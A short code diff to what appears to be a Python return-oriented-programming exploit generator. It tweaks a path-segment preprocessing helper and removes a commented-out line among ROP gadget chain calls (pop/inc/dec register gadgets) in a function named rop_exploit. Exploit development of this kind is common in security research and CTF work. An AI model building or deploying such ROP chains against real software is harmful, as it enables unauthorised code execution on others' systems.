@@ -39,6 +39,9 @@ def preprocess(p):
         result = ""
         subargs = p.split('/')
         for subarg in subargs:
+            if subarg == ".":
+                result += subarg
+                continue
             if subarg:
                 while len(subarg) < 3:
                     subarg = '/' + subarg
@@ -121,7 +124,6 @@ def rop_exploit(cli_args, base_address):
     
 
     exploit += address_pop.pop_reg(data + 60,gadgets['POPECXEBX'],0,gadgets['INCECX'],"inc")[0]
-    # exploit += address_pop.pop_reg(data,NOP,0,INCEBX,"inc")
     exploit += address_pop.pop_reg(data,gadgets['POPEBX'],0,gadgets['INCEBX'],"inc")[0]
 
     exploit += address_pop.pop_reg(data + 48,gadgets['POPEDX'],0,gadgets['DECEDX'],"dec")[0]
